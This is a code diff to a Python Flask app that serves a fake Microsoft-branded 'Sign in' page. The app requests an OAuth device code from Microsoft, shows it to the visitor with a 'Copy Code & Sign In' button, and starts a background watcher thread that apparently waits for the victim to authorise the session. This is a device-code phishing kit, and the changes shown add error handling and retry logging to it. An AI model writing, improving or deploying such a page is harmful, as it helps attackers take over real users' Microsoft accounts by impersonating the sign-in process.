@@ -170,16 +170,23 @@ border-radius:4px;text-align:center;margin-top:10px}
 .btn:hover{background:#106ebe}
 .note{font-size:13px;color:#605e5c;margin-top:24px;text-align:center}
 .status{font-size:14px;color:#107c10;margin-top:10px;text-align:center;display:none}
+.error{font-size:14px;color:#d13438;margin-top:10px;text-align:center}
 </style></head><body>
 <div class='card'>
 <div class='logo'>Microsoft</div>
 <h2>Sign in</h2>
 <p>To continue, please verify your identity by entering the code below at the Microsoft sign-in page.</p>
-<div class='code-box' id='codeDisplay'>{{ user_code }}</div>
-<button class='btn' onclick='copyAndRedirect()'>Copy Code & Sign In</button>
-<p class='note'>Code expires in 15 minutes. Do not close this window.</p>
-<div id='statusMsg' class='status'>Verification successful! Redirecting...</div>
+{% if error %}
+    <div class='error'>{{ error }}</div>
+    <button class='btn' onclick='location.reload()'>Retry</button>
+{% else %}
+    <div class='code-box' id='codeDisplay'>{{ user_code }}</div>
+    <button class='btn' onclick='copyAndRedirect()'>Copy Code & Sign In</button>
+    <p class='note'>Code expires in 15 minutes. Do not close this window.</p>
+    <div id='statusMsg' class='status'>Verification successful! Redirecting...</div>
+{% endif %}
 </div>
+{% if not error %}
 <script>
 let sid = "{{ sid }}";
 function copyAndRedirect() {
@@ -204,12 +211,15 @@ setInterval(async () => {
     } catch(e) {}
 }, 3000);
 }
-</script></body></html>"""
+</script>
+{% endif %}
+</body></html>"""
 
 @app.route("/")
 def home():
     try:
         dc = None
+        # Retry logic for Microsoft API
         for i in range(3):
             try:
                 resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
@@ -217,7 +227,10 @@ def home():
                 dc = resp.json()
                 if "user_code" in dc:
                     break
-            except Exception:
+                elif "error" in dc:
+                    print(f"Microsoft API Error: {dc['error']} - {dc.get('error_description')}")
+            except Exception as e:
+                print(f"Request Error: {e}")
                 time.sleep(2)
         
         if not dc or "user_code" not in dc:
@@ -228,6 +241,7 @@ def home():
         Thread(target=watcher, args=(sid, dc), daemon=True).start()
         return render_template_string(PAGE, user_code=dc["user_code"], sid=sid, error=None)
     except Exception as e:
+        print(f"Home Route Error: {e}")
         return render_template_string(PAGE, error=f"Connection error. Please try again.", sid="", user_code="")
 
 @app.route("/status")
